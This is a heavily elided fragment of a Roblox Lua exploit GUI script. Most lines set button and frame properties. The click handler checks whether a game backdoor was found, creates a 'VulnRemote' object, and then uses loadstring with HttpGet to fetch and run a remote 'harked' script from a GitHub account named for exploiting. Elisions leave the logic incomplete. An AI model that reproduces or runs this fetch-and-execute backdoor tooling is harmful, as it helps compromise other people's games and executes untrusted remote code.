...
G2L["2"]["BackgroundTransparency"] = 0.07;
...
G2L["4"]["RichText"] = true;
G2L["4"]["Size"] = UDim2.new(0, 106, 0, 50);
...
G2L["5"]["BackgroundTransparency"] = 0.27;
...
local script = G2L["6"];
	...
	script.Parent.MouseButton1Click:Connect(function()
		...
		if backdoorfound then
			...
			local VulnRemote = Instance.new("ObjectValue") -- dualhook if the deletebind is not working
			...
			loadstring(game:HttpGet("https://raw.githubusercontent.com/Robloxexploiter691/harked-v2/refs/heads/main/fluentuiharked.lua"))();
			task.wait(5);
			mgui:Destroy();
		else
